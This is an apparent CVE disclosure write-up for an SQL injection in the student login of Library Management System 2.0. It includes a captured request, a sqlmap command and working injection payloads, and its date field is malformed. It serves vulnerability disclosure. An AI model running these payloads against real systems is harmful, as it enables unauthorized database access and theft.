# CVE-2023-7110_Library-Management-System_SQL_Injection-2
+ **Exploit Title:** CVE-2023-7110_Library-Management-System_SQL_Injection-2
+ **Date:** 2023-23-12
+ **Exploit Author:** Hamdi Sevben
+ **Vendor Homepage:** https://code-projects.org/library-management-system-in-php-with-source-code-ver-2-0/
+ **Software Link:** https://download-media.code-projects.org/2020/02/LIBRARY_MANAGEMENT_SYSTEM_IN_PHP_WITH_SOURCE_CODE_VER.2.0.zip
+ **Version:** 2.0
+ **Tested on:** Windows 10 Pro + PHP 8.1.6, Apache 2.4.53
+ **CVE:** CVE-2023-7110

## References: 
+ **CVE-2023-7110:** https://vuldb.com/?id.249005
+ https://www.cve.org/CVERecord?id=CVE-2023-7110

## Description:
Library Management System 2.0 allows SQL Injection via parameter 'student' in "/libsystem/login.php".
Exploiting this issue could allow an attacker to compromise the application, access or modify data,  or exploit latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to the student login panel: "http://localhost/libsystem/login.php"
+ Fill the student id then click 'Login' button.
+ Intercept the request via Burp Suite and send to Repeater.
+ Copy and paste the request to a "r.txt" file.
+ Captured Burp request:
```
POST /libsystem/login.php HTTP/1.1
Host: localhost
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Content-Length: 302
Content-Type: application/x-www-form-urlencoded
Origin: http://localhost
Referer: http://localhost/libsystem/
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36

student=test&login=
```

+ Use sqlmap to exploit. In sqlmap, use 'student' parameter to dump the database. 
```
python sqlmap.py -r r.txt -p student --risk 3 --level 5 --threads 1 --random-agent tamper=between,randomcase --proxy="http://127.0.0.1:8080" --dbms mysql --batch --current-db
```

```
---
Parameter: student (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: student=test' OR NOT 8837=8837-- xdiM&login=

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: student=test' AND (SELECT 9935 FROM(SELECT COUNT(*),CONCAT(0x7162627671,(SELECT (ELT(9935=9935,1))),0x716a7a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- pYgV&login=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: student=test' AND (SELECT 5778 FROM (SELECT(SLEEP(5)))XMIO)-- jzYc&login=
---
[12:29:48] [INFO] the back-end DBMS is MySQL
web application technology: PHP, PHP 8.1.6, Apache 2.4.53
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[12:29:49] [INFO] fetching current database
[12:29:49] [INFO] retrieved: 'libsystem'
current database: 'libsystem'
```

+ current database: `libsystem`
![2](https://github.com/h4md153v63n/CVEs/assets/5091265/f6d52d8d-69a3-4915-a235-3126417374ec)

